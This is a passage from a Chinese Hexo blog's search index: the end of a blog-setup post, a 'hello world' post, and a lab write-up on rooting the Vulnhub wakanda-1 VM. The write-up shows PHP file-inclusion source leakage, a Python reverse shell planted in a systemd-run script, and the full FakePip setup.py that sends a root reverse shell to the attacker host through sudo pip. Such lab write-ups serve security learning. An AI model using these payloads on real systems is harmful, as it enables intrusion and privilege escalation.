punctuation">.</span>target<span class="token punctuation">.</span>nodeName<span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>render<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">updateCoords</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">animateParticules</span><span class="token punctuation">(</span>pointerX<span class="token punctuation">,</span>pointerY<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">setCanvasSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"resize"</span><span class="token punctuation">,</span>setCanvasSize<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>在/layout/layout.ejs中写入：</p><pre class=" language-html"><code class="language-html">{% if theme.fireworks %}   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>canvas</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fireworks<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">position</span><span class="token punctuation">:</span> fixed<span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token property">z-index</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token property">pointer-events</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>canvas</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>//cdn.bootcss.com/animejs/2.2.0/anime.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/js/src/fireworks.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>{% endif %}</code></pre><p>然后，在相应主题的config文件加入</p><pre class=" language-shell"><code class="language-shell">fireworks: true</code></pre><h2><span id="9-she-zhi-ping-lun-gong-neng-gitment">9.设置评论功能Gitment</span><a href="#9-she-zhi-ping-lun-gong-neng-gitment" class="header-anchor">#</a></h2><p><img src="https://i.loli.net/2018/10/06/5bb852eb79447.png" alt=""></p><p>owner github用户名，repo存储评论的仓库，clientId和clientSecret需要自己注册github app</p><p><a href="https://github.com/settings/applications" target="_blank" rel="noopener">https://github.com/settings/applications</a></p><p>切记Authorization callback URL 要填写CNAME解析的域名（未解析则填默认github的域名），否则可能无法使用</p><p><img src="https://i.loli.net/2018/10/06/5bb8533843b56.png" alt=""></p><p>然后凄惨地发现作者服务停止了，参考<a href="https://www.jianshu.com/p/f2f4c802914b" target="_blank" rel="noopener">https://www.jianshu.com/p/f2f4c802914b</a></p><h2><span id="10-tian-jia-ping-lun-fu-wu-discus">10.添加评论服务 discus</span><a href="#10-tian-jia-ping-lun-fu-wu-discus" class="header-anchor">#</a></h2><p>无法注册，国内无法访问等问题。。</p>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git账户 </tag>
            
            <tag> Hexo搭建 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Yof3ng博客迁移</title>
      <link href="/2018/10/04/hello-world/"/>
      <url>/2018/10/04/hello-world/</url>
      
        <content type="html"><![CDATA[<h1 id="博客迁移"><a href="#博客迁移" class="headerlink" title="博客迁移"></a>博客迁移</h1><h3 id="hello-world"><a href="#hello-world" class="headerlink" title="hello world"></a>hello world</h3>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客迁移 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>wakanda-1-靶机渗透</title>
      <link href="/2018/09/15/wakanda-1-%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
      <url>/2018/09/15/wakanda-1-%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1><span id="-对wakanda靶机的渗透之旅">-对wakanda靶机的渗透之旅</span></h1><p>​    从vulhub上下载靶机后，本打算在vm上搭建，后发现ova导入有点问题，故在virtualbox上搭建成功，我们需要获得flag1.txt,flag2.txt,root.txt 三个文件的信息，将攻击机，靶机均设为桥接网卡模式，因为我的kali是在vm里面。</p><p>​    靶机下载地址:<a href="https://www.vulnhub.com/entry/wakanda-1,251/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/wakanda-1,251/</a></p><h2><span id="0x00-渗透过程">0x00 渗透过程</span></h2><h3><span id="1对靶机的信息收集">1.对靶机的信息收集</span></h3><p>攻击机：</p><pre><code>自用kali--IP地址:192.168.1.107</code></pre><p>kali netdiscover 启动:</p><p><img src="https://i.loli.net/2018/10/06/5bb89ebe12b5d.png" alt=""></p><p>​    那么可以得到靶机 IP ：192.168.1.108 ，既然得到了靶机ip地址，那么拿出nmap神器对其进行一波扫描，获得更详细的靶机信息。</p><pre class=" language-bash"><code class="language-bash">nmap -sV 192.168.1.108</code></pre><p><img src="https://i.loli.net/2018/10/06/5bb89ecba4d21.png" alt=""></p><p>​    由nmap扫描得出的信息，开启了80端口的web服务，然后是3333端口的一个Openssh服务，这里需要做一下笔记，ssh连接是3333端口而不是常规的22端口哦！先去80端口访问一下看看情况：</p><p><img src="https://i.loli.net/2018/10/06/5bb89ed45deb8.png" alt=""></p><p>​    emmm,发现就一个普通页面啥也没有，只有一个看似有用的 Made by@mamadou ???难道是个用户名还是个密码啥的？先做笔记记一下，萌新就是什么都要做笔记，接下来扫一下目录看看:</p><p><img src="https://i.loli.net/2018/10/06/5bb89edbcd18b.png" alt=""></p><p>​    扫到几个页面，但是貌似SIZE都是0，被CTF各种虐的我还是选择去看看页面里有没有东西。==&gt;转了一圈发现确实是空的，那咋办，难道渗透之旅到此结束？仔细想了几分钟，既然只有一个页面，忘记看源码了，源码如下:</p><p><img src="https://i.loli.net/2018/10/06/5bb89ee81c834.png" alt=""></p><p>​    这绿的我发慌的一串注释，不用直觉我猜也是靶机的切入点了，lang参数改变会影响页面的语言显示，猜测可能是 lang参数改变了使用的语言php文件，那么就是和文件相关的漏洞咯！</p><p>​    但是只有这一个页面，应该可以检测一下这个参数是否可以进行本地文件包含(Local File Include)，将这唯一的一个页面的完整源码给读下来。利用之前做ctf还算有一点点的经验（参考<a href="https://blog.csdn.net/qq_35544379/article/details/78230629），我们可以用" target="_blank" rel="noopener">https://blog.csdn.net/qq_35544379/article/details/78230629），我们可以用</a> php://filter 这个协议的一些小特性来将源码以base64的形式down下来:</p><p><img src="https://i.loli.net/2018/10/06/5bb89ef3e3358.png" alt=""></p><p>​    然后base64解码得到如下完整的源码：</p><pre><code>&lt;?php$password =&quot;Niamey4Ever227!!!&quot; ;//I have to remember itif (isset($_GET[&#39;lang&#39;])){include($_GET[&#39;lang&#39;].&quot;.php&quot;);}?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt;    &lt;meta name=&quot;description&quot; content=&quot;Vibranium market&quot;&gt;    &lt;meta name=&quot;author&quot; content=&quot;mamadou&quot;&gt;    &lt;title&gt;Vibranium Market&lt;/title&gt;    &lt;link href=&quot;bootstrap.css&quot; rel=&quot;stylesheet&quot;&gt;    &lt;link href=&quot;cover.css&quot; rel=&quot;stylesheet&quot;&gt;   &lt;/head&gt;  &lt;body class=&quot;text-center&quot;&gt;    &lt;div class=&quot;cover-container d-flex w-100 h-100 p-3 mx-auto flex-column&quot;&gt;      &lt;header class=&quot;masthead mb-auto&quot;&gt;        &lt;div class=&quot;inner&quot;&gt;          &lt;h3 class=&quot;masthead-brand&quot;&gt;Vibranium Market&lt;/h3&gt;          &lt;nav class=&quot;nav nav-masthead justify-content-center&quot;&gt;            &lt;a class=&quot;nav-link active&quot; href=&quot;#&quot;&gt;Home&lt;/a&gt;            &lt;!-- &lt;a class=&quot;nav-link active&quot; href=&quot;?lang=fr&quot;&gt;Fr/a&gt; --&gt;          &lt;/nav&gt;        &lt;/div&gt;      &lt;/header&gt;      &lt;main role=&quot;main&quot; class=&quot;inner cover&quot;&gt;        &lt;h1 class=&quot;cover-heading&quot;&gt;Coming soon&lt;/h1&gt;        &lt;p class=&quot;lead&quot;&gt;          &lt;?php            if (isset($_GET[&#39;lang&#39;]))          {          echo $message;          }          else          {            ?&gt;            Next opening of the largest vibranium market. The products come directly from the wakanda. stay tuned!            &lt;?php          }?&gt;        &lt;/p&gt;        &lt;p class=&quot;lead&quot;&gt;          &lt;a href=&quot;#&quot; class=&quot;btn btn-lg btn-secondary&quot;&gt;Learn more&lt;/a&gt;        &lt;/p&gt;      &lt;/main&gt;      &lt;footer class=&quot;mastfoot mt-auto&quot;&gt;        &lt;div class=&quot;inner&quot;&gt;          &lt;p&gt;Made by&lt;a href=&quot;#&quot;&gt;@mamadou&lt;/a&gt;&lt;/p&gt;        &lt;/div&gt;      &lt;/footer&gt;    &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>​    oh！get到一个password：Niamey4Ever227!!!</p><p>​    到现在，我们收集到了作者的名称 mamadou，开放在3333端口的ssh服务，然后一个password。</p><hr><h3><span id="2开始渗透靶机">2.开始渗透靶机</span></h3><p>​    二话不说，用ssh试试远程登录靶机：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> 192.168.1.108 -l mamadou -p 3333</code></pre><p>​    输入Niamey4Ever227!!!作为密码登录，两秒之后，弹出来一个python shell界面？见识短浅见识短浅，试试用python的pty把完全交互式的终端弄出来。</p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span><span class="token keyword">from</span> pty <span class="token keyword">import</span> spawn<span class="token operator">>></span><span class="token operator">></span>spawn<span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span>mamadou@Wakanda1<span class="token punctuation">:</span><span class="token operator">~</span>$ </code></pre><p><img src="https://i.loli.net/2018/10/06/5bb89f067fc33.png" alt=""></p><p>​    问题不大，ls看一下目录，看到了我们要找的第一个flag,也就是flag1.txt，然后cat flag1.txt ==&gt; Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc</p><p>​    接下来就是找一下flag2.txt了，到上级目录看到了另外一个用户 devops 的目录，进去看看找到了flag2.txt，但是没有权限，需要以devops的身份打开。</p><p><img src="https://i.loli.net/2018/10/06/5bb89f0ef1687.png" alt=""></p><p>​    去别的目录逛一逛，果然/tmp目录下是有点东西的，但是只是一个test文件，里面含有一个‘test’字符串，并没有什么不同。</p><p>​    看看跟devops有关系的文件有哪些:</p><p><img src="https://i.loli.net/2018/10/06/5bb89f16aa291.png" alt=""></p><p>​    第一个还是仅有的一个就是一个python脚本的样子（忽略后面的setup.py，因为是做完之后写的文章，setup.py是后面我弄进去的文件），看看.antivirus.py内容是啥:</p><pre class=" language-python"><code class="language-python">open<span class="token punctuation">(</span><span class="token string">'/tmp/test'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span></code></pre><p>​    就一行，和test扯上了关系，往之前/tmp/目录下的test文件写入‘test’字符串。这个python脚本是可写的，我能将shell写入其中并且运行，但是反弹的用户却仍然是mamadou，而不是想要的devops，问题在哪呢？思考很久，查了下antivirus的意思’抗生素’，没啥用。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#.antivirus.py--payload</span><span class="token keyword">import</span> socket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>os<span class="token punctuation">;</span>s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'192.168.1.107'</span><span class="token punctuation">,</span><span class="token number">7777</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'/bin/bash'</span><span class="token punctuation">,</span><span class="token string">'-i'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>​    后来经人点拨，恍然大悟，如果这个脚本是会自动运行的，那么就不会反弹mamadou权限的shell了，而是它本身具有的devops权限，而经过查询资料，了解到存放在/src目录下的一般为系统服务类脚本文件，那么它自动运行的假设就显然可以成立了（我还是对有些性质不够了解）。</p><pre><code>#用此命令查看.antivirus.py是否自动运行mamadou@Wakanda1:/srv$ grep -R .antivirus.py / 2&gt;/dev/null/lib/systemd/system/antivirus.service:ExecStart=/usr/bin/env python /srv/.antivirus.py#确实在自动运行，查看一下antivirus.service文件[Unit]Description=AntivirusAfter=network.targetStartLimitIntervalSec=0[Service]Type=simpleRestart=alwaysRestartSec=300User=devopsExecStart=/usr/bin/env python /srv/.antivirus.py[Install]WantedBy=multi-user.target#可以看到是每300秒执行一次</code></pre><p>​    那么接下来，写入的shell原封不动，kali攻击机nc监听7777端口，等待.antivirus.py自动运行(一分一秒地等待总是漫长的）。</p><p><img src="https://i.loli.net/2018/10/06/5bb89f341619f.png" alt=""></p><p>​    果不其然，获得了反弹devops权限的shell，那么cat flag2.txt ==&gt;Flag 2 : d8ce56398c88e1b4d9e5f83e64c79098</p><p>​    那么下一步就是拿下root权限，攻入root目录了。</p><hr><h3><span id="3攻破root">3.攻破root</span></h3><p>​    先看看devops用户权限大概是怎样的, 执行sudo -l命令：</p><p><img src="https://i.loli.net/2018/10/06/5bb89f44d2154.png" alt=""></p><p>​    然而，只有一个pip命令是可以不需要root权限就能执行的，试试pip install falsk，没问题。</p><p>​    那么怎样才能通过pip来获取root权限呢？这里用到一个github上的开源脚本Fakepip。这个脚本通过在pip重新安装时执行的setup.py文件中插入shellcode，导致其可通过pip反弹root权限的shell给攻击机。项目地址(<a href="https://github.com/0x00-0x00/FakePip.git" target="_blank" rel="noopener">https://github.com/0x00-0x00/FakePip.git</a>)</p><p>​    接下来在攻击机上把Fakepip给git下来,然后进入Fakepip目录,将setup.py中的RHOST参数改为攻击机地址:192.168.1.107,然后启动python的简易服务器。</p><pre><code>from setuptools import setupfrom setuptools.command.install import installimport base64import osclass CustomInstall(install):  def run(self):    install.run(self)    RHOST = &#39;192.168.1.107&#39;  # change this    reverse_shell = &#39;python -c &quot;import os; import pty; import socket; lhost = \&#39;%s\&#39;; lport = 443; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((lhost, lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\&#39;HISTFILE\&#39;, \&#39;/dev/null\&#39;); pty.spawn(\&#39;/bin/bash\&#39;); s.close();&quot;&#39; % RHOST    encoded = base64.b64encode(reverse_shell)    os.system(&#39;echo %s|base64 -d|bash&#39; % encoded)setup(name=&#39;FakePip&#39;,      version=&#39;0.0.1&#39;,      description=&#39;This will exploit a sudoer able to /usr/bin/pip install *&#39;,      url=&#39;https://github.com/0x00-0x00/fakepip&#39;,      author=&#39;zc00l&#39;,      author_email=&#39;andre.marques@esecurity.com.br&#39;,      license=&#39;MIT&#39;,      zip_safe=False,      cmdclass={&#39;install&#39;: CustomInstall})</code></pre><p><img src="https://i.loli.net/2018/10/06/5bb89f5460351.png" alt=""></p><p>​    然后在devops靶机上用<code>wget http://192.168.1.107/setup.py</code> 将攻击机上的setup.py下载到本地，攻击机kali开始用nc监听443端口，准备接收即将到来的shell。</p><p>​    在devops靶机上命令pip重装：<code>sudo pip install ./ --upgrade --force-install</code></p><p><img src="https://i.loli.net/2018/10/06/5bb89f60ece0f.png" alt=""></p><p>​    kali兴奋地一把接到反弹过来的shell：</p><p><img src="https://i.loli.net/2018/10/06/5bb89f65ea5ee.png" alt=""></p><p><code>cd root</code> ,然后<code>cat root.txt</code>:</p><p><img src="https://i.loli.net/2018/10/06/5bb89f7108f3e.png" alt=""></p><p>​    萌新的渗透到此暂停emmmm。</p><hr><h2><span id="0x01-小知识">0x01 小知识</span></h2><hr><h3><span id="nmap-plus">nmap plus</span></h3><p>1.特殊扫描方式 ==&gt; nmap -sV/-sP/-sS/sL  其中-sP是用于扫描IP段的</p><p>2.详细地扫描目标：</p><p>nmap -sV 或者 nmap -p- -A  &lt;目标ip&gt;</p><p>或者超强力的： nmap -sS -sV  -A  -p- &lt;目标ip&gt;</p><hr><h3><span id="python-反弹shell-amp-pip-get-shell">python 反弹shell &amp; pip get shell</span></h3><p>python 反弹 shell:</p><pre class=" language-bash"><code class="language-bash">python -c <span class="token string">"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("</span>192.168.1.107<span class="token string">",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["</span>/bin/sh<span class="token string">","</span>-i<span class="token string">"]);"</span></code></pre><p>python构造完全交互式终端 :</p><pre class=" language-bash"><code class="language-bash"> python -c <span class="token string">"import pty;pty.spawn('/bin/bash')"</span></code></pre><hr><h3><span id="php-filter-and-input-lfi本地文件包含漏洞">php filter and input –LFI本地文件包含漏洞</span></h3><p>参考 <a href="https://blog.csdn.net/qq_35544379/article/details/78230629" target="_blank" rel="noopener">https://blog.csdn.net/qq_35544379/article/details/78230629</a></p><p>php://filter,php://input,php://output都是有妙用的哦！</p><hr><h3><span id="msfvenom-p-生成shell">msfvenom -p   生成shell</span></h3><p><img src="https://i.loli.net/2018/10/06/5bb89f84ea8cc.png" alt=""></p><p>​    但在渗透过程中发现，不用msfvenom生成的加密shell也能成功反弹，不过还是要养成好习惯，多用用这种神器提高效率并且准确率。</p><p>参考链接 <a href="https://www.cnblogs.com/xishaonian/p/6851475.html" target="_blank" rel="noopener">https://www.cnblogs.com/xishaonian/p/6851475.html</a></p><hr><h3><span id="linux-中的一些命令与特性">linux 中的一些命令与特性</span></h3><p>==&gt; su &amp; sudo </p><p>可用于切换用户</p><p>==&gt; lsattr 是 ls的升级版，就如aptitude 与apt相似一样</p><p>==&gt; find / -user root 2&gt;/dev/null 查看用户属性为root的文件</p><p>==&gt;ps -aux 查看所有服务  ==&gt;top 查看进程</p><hr><h2><span id="0x02-总结">0x02 总结</span></h2><p>​    渗透一定一定注意信息收集，思维拓展，然后就是扎实的基础！</p><p>​    作为萌新，没有那么强的能力，确实有点吃力，但是吃力的过程也在进步，就像不停的被虐的过程，自然自己的等级也在提高，不停地膜大神的文章的同时，自己也会受其影响，我是萌新，各位大佬轻喷哦！</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
